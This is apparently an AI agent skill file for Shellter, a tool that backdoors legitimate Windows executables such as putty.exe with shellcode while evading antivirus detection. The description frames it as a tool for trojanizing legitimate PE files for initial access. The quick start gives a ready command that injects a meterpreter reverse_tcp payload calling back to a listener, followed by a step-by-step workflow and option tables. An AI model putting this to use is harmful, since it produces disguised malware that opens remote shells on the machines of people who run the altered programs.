---
name: shellter
description: "Shellter: dynamic shellcode injection tool that backdoors native Windows PE executables while preserving original functionality to evade AV detection. Use when trojanizing legitimate PE files (putty, vlc, notepad++) with custom shellcode payloads for initial access."
license: Freeware (Pro commercial)
compatibility: "Windows native. Runs on Linux/macOS via Wine. Targets Windows PE32 executables."
metadata:
  author: AeonDave
  version: "1.0"
---

# Shellter

Dynamic shellcode injection into legitimate PE files.

## Quick Start

```bash
# Interactive (Windows or Wine on Linux)
shellter.exe

# Auto mode
wine shellter.exe -a -f putty.exe -p windows/meterpreter/reverse_tcp \
  --lhost 10.0.0.1 --lport 4444
```

## Workflow

1. Choose a legitimate PE target (putty.exe, vlc.exe, notepad++.exe)
2. Shellter analyzes execution flow, identifies injection points
3. Select MSF payload or provide custom shellcode bytes
4. Shellter injects and outputs a modified PE
5. Original functionality preserved — reduced AV signature match

## Modes

| Mode | Flag | Use |
|------|------|-----|
| Auto | `-a` | Non-interactive, fastest |
| Manual | (interactive) | Full injection point control |

## Key Options (Auto Mode)

| Flag | Purpose |
|------|---------|
| `-f <pe>` | Target PE file |
| `-p <payload>` | MSF payload string |
| `--lhost / --lport` | Listener address |
| `-e <encoder>` | MSF encoder |

## Resources

| File | When to load |
|------|--------------|
| `references/` | Custom shellcode injection, encoder selection |
